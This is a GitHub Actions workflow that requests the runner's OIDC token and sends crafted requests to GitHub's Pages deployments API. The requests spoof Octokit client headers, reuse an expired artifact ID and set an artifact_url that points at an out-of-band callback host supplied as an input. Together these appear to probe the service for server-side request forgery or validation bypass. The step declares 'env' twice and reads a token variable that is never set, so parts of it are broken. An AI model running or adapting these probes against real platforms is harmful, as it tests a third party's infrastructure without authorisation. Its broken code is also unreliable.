name: bf45-octokit-match
on:
  workflow_dispatch:
    inputs:
      oob: { required: true }
permissions:
  contents: read
  pages: write
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - run: mkdir -p _site && echo '<html>octokit-match</html>' > _site/index.html
      - uses: actions/upload-pages-artifact@v3
        with: { path: _site }
      - name: octokit-match
        env:
          GH_TOKEN: ${{ github.token }}
          OOB: ${{ inputs.oob }}
        run: |
          set -u
          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                      "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
          echo "::add-mask::$OIDC"
          
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          ART_ID=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" | \
            jq -r '.artifacts[0].id')
          echo "Artifact: $ART_ID"
          
          BODY="{\"artifact_id\":$ART_ID,\"pages_build_version\":\"$GITHUB_SHA\",\"oidc_token\":\"$OIDC\"}"
          
          # Test 1: Full Octokit header set
          echo "===== TEST 1: Full Octokit headers ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "$BODY"
          
          sleep 3
          
          # Test 2: Node.js script using @octokit/core directly (the REAL test)
          echo "===== TEST 2: node octokit-request ====="
          npm install --no-save @octokit/core 2>/dev/null
          node -e "
const { Octokit } = require('@octokit/core');
const o = new Octokit({ auth: process.env.GH_TOKEN });
o.request('POST /repos/{owner}/{repo}/pages/deployments', {
  owner: '${{ github.repository_owner }}',
  repo: '${GITHUB_REPOSITORY#*/}',
  artifact_id: $ART_ID,
  pages_build_version: '${GITHUB_SHA}-node',
  oidc_token: process.env.OIDC_TOK
}).then(r => console.log('HTTP='+r.status, JSON.stringify(r.data))).catch(e => console.log('HTTP='+e.status, e.message));
          " 2>/dev/null || echo "node test failed"
          
          sleep 3
          
          # Test 3: Expired artifact with full Octokit headers
          echo "===== TEST 3: Expired + Octokit headers ====="
          curl -s -w '\nHTTP=%{http_code}\n' -X POST "$API" \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Content-Type: application/json; charset=utf-8" \
            -H "User-Agent: octokit-core.js/5.0.0 Node.js/20.0.0" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            -d "{\"artifact_id\":10387063794,\"artifact_url\":\"https://$OOB/vfy-bf45/octokit?arm=3\",\"pages_build_version\":\"${GITHUB_SHA}-t3\",\"oidc_token\":\"$OIDC\",\"environment\":\"github-pages\"}"
          
          echo "===== waiting 60s ====="
          sleep 60
        env:
          OIDC_TOK: ${{ env.OIDC }}
